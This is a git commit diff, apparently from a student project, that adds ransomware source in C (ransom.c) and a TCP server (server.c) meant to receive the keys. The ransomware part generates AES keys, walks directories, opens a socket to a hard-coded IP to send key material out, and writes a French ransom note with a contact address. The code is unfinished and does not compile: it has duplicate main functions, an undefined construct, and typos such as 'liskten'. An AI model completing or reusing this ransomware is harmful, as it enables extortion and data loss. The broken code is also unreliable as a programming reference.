c9395e70a1dcf140701f5d6a0c8be855556f6d1f
Max <maxencedelbrouck@hotmail.com>
2022-01-08 12:12:28 +0100

    *

--- ransom.c
+++ ransom.c
@@ -1,23 +1,165 @@
 #include "ransomlib.h"
 #include <dirent.h>
+#include <stdio.h>
 // for socket
 #include <sys/socket.h>
 #include <unistd.h> 
 #include <arpa/inet.h>
-
-
+#include <string.h>
+// for isFile()
+#include <sys/types.h> //isFile()
+#include <errno.h>
+//ransomlib.h réécrit
+#define SIZEKEY AES_256_KEY_SIZE
+#define SIZEIV AES_BLOCK_SIZE
 
 void usage();
-
 int is_encrypted(char *filename);
-
 void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);
-
+int isFile(const char* name);
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
-
 int send_key(char *pKey, char *pIv);
+
+void usage(void){
+    printf(
+            "\nUsage:\n"
+            " ./ransom <path> [e|d] <key in hex if decrypt>"
+            );
+    printf(
+            "\nOptions:\n"
+            "-e    Encrypt input and store results to output\n"
+            "-d    Decrypt input and store results to output\n"
+            "-h    Print this message\n"
+            "-k    Followed by Key\n"
+            "-v    Followed by Vector\n\n"
+            "-h    Print this message\n"
+
+            );
+}
+
+int is_encrypted(char *filename){
+    char buffer_filename[strlen(filename)];
+
+    strcpy(buffer_filename, filename);
+    char *token = strtok(buffer_filename, ".");
+
+    while(token != NULL){
+        if(strcmp(token, "encrypt") == 0){
+            return 1;
+        }
+        token = strtok(NULL, ".");
+    }
+    return 0;
+}
+
+void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){
+
+    directeur(*name){
+        struct dirent *dir;
+        // opendir() renvoie un pointeur de type DIR.
+        DIR *d = opendir(".");
+        if (d)
+        {
+            while ((dir = readdir(d)) != NULL)
+            {
+                printf("%s\n", dir->d_name);
+                if(isFile(dir->d_name)==0)
+                {
+                    directeur(dir->d_name);
+                }
+            }
+            closedir(d);
+        }
+    }
+}
+
+int isFile(const char* name)
+{
+    DIR* directory = opendir(name);
+
+    if(directory != NULL)
+    {
+        closedir(directory);
+        return 0;
+    }
+    if(errno == ENOTDIR)
+    {
+        return 1;
+    }
+    return -1;
+}
+
+int main(void) {
+
+
+
+
+
+
+
+
+
+}
+
+int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){
+    if(RAND_bytes(key, sizeKey) == 0) {
+        test(key,sizeKey);
+    }
+    if(RAND_bytes(iv, sizeIv) == 0) {
+        test(iv, sizeIv);
+    }
+    bytes_to_hexa(key, pKey, sizeKey);
+    bytes_to_hexa(iv, pIv, sizeIv);
+}
+
+int send_key(char *pKey, char *pIv)
+{
+    int sockid;
+    int server_port = 8888;
+    char *server_ip = "192.168.232.128";
+
+    sockid = socket(AF_INET,SOCK_STREAM,0);
+
+    struct sockaddr_in server_addr,
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(server_port);
+    server_addr.sin_addr.s_addr = inet_addr(server_ip);
+
+    char *msg = "hello";
+
+    connect(sockid,(struct sockaddr *)&server_addr,sizeof(server_addr));
+
+    send(sockid, (const char *)msg, strlen(msg),0)
+
+    close(sockid);
+
+}
 
 int main (int argc, char * argv[])
 {
-	printf("Non\n");
+
+
+
+
+    //Get Arguments
+
+
+
+
+        //Ransom Letter
+        FILE* fichier = NULL;
+
+        fichier = fopen("ransom.txt", "w");
+
+        if (fichier != NULL)
+        {
+            fputs("Votre Ordinateur a été intercepté et mis sous quarantaine\nVeuillez nous contacter à l'adresse suivante pour que l'on vous débloque l'accès à votre machine:\n getpowned@yahoo.fr", fichier);
+            fclose(fichier);
+        }
+
+        return 0;
+    }
+
 }
+
+
--- server.c
+++ server.c
@@ -1,63 +1,62 @@
 #include <stdio.h>
-#include <string.h>
 #include <sys/socket.h>
-#include <arpa/inet.h>
+#include <unistd.h> // for close()
+#include <arpa/inet.h> // for init_addr
+#include <stdlib.h>
 
-int main(void){
-    int socket_desc;
+#define BUFSIZE 1024
+#define SERVER_IP "127.0.0.1"
+
+void handle_error()
+{
+    printf("Error\n");
+    exit(0);
+}
+
+int main(void)
+{
+    int sockid;
+    int server_port = 8888;
+    char *server_ip = SERVER_IP;
+
+    sockid = socket(AP_INET,SOCK_STREAM,0);
+
     struct sockaddr_in server_addr, client_addr;
-    char server_message[2000], client_message[2000];
-    int client_struct_length = sizeof(client_addr);
-
-    // Clean buffers:
-    memset(server_message, '\0', sizeof(server_message));
-    memset(client_message, '\0', sizeof(client_message));
-
-    // Create UDP socket:
-    socket_desc = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-
-    if(socket_desc < 0){
-        printf("Error while creating socket\n");
-        return -1;
-    }
-    printf("Socket created successfully\n");
-
-    // Set port and IP:
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(2000);
-    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    server_addr.sin_port = htons(server_port);
+    server_addr.sin_addr.s_addr = inet_addr(server_ip);
 
-    // Bind to the set port and IP:
-    if(bind(socket_desc, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0){
-        printf("Couldn't bind to the port\n");
-        return -1;
+    char *buffer[BUFSIZE];
+    int n, len, client_socket;
+
+    int bind_result = bind(sockid,(const struct sockaddr *)&server_addr,sizeof (server_addr));
+
+    if (bind_result<0){
+        printf("Error during binding\n");
     }
-    printf("Done with binding\n");
+    else {
+        printf("Server listening on %s:%d\n",server_ip,server_port);
+        n = liskten(sockid,1);
 
-    printf("Listening for incoming messages...\n\n");
+        if(n<0){
+            printf("Error during listen()\n");
+            handle_error();
+        }
 
-    // Receive client's message:
-    if (recvfrom(socket_desc, client_message, sizeof(client_message), 0,
-                 (struct sockaddr*)&client_addr, &client_struct_length) < 0){
-        printf("Couldn't receive\n");
-        return -1;
+        len = sizeof(client_addr);
+        client_socket = accept(sockid,(struct sockaddr *)&client_addr,&len);
+
+        if(client_socket<0){
+            printf("Error during accept()\n");
+            handle_error()
+        }
+
+        printf("Accepted connection from %d %s:%d\n",client_socket,inet_ntoa(client_addr.sin_addr),client_addr.sin_port);
+
+        n = recv(client_socket, (char *)buffer, BUFSIZE, MSG_WAITALL);
+
+        printf("Message of size %d received: %s\n",n,buffer);
     }
-    printf("Received message from IP: %s and port: %i\n",
-           inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
 
-    printf("Msg from client: %s\n", client_message);
-
-    // Respond to client:
-    strcpy(server_message, client_message);
-
-    if (sendto(socket_desc, server_message, strlen(server_message), 0,
-               (struct sockaddr*)&client_addr, client_struct_length) < 0){
-        printf("Can't send\n");
-        return -1;
-    }
-
-    // Close the socket:
-    close(socket_desc);
-
-    return 0;
+    close(sockid);
 }
